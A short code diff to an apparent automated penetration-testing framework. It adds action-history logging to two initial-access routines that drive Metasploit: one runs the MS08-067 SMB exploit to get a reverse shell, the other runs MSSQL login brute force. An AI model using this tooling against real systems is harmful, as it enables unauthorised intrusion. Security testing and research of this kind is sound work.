@@ -23,6 +23,7 @@ class InitialAccess(object):
         Create a reverse shell with target
         """
         target = config.TARGETS[target_name]
+        target.action_history.append("exploit_cve_2008_4250")
         # setup exploit
         cmd = "use exploit/windows/smb/ms08_067_netapi"
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
@@ -56,6 +57,7 @@ class InitialAccess(object):
         Create a reverse shell with target
         """
         target = config.TARGETS[target_name]
+        target.action_history.append("exploit_msql_brute_force")
         # setup exploit (part 1)
         cmd = "use auxiliary/scanner/mssql/mssql_login"
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
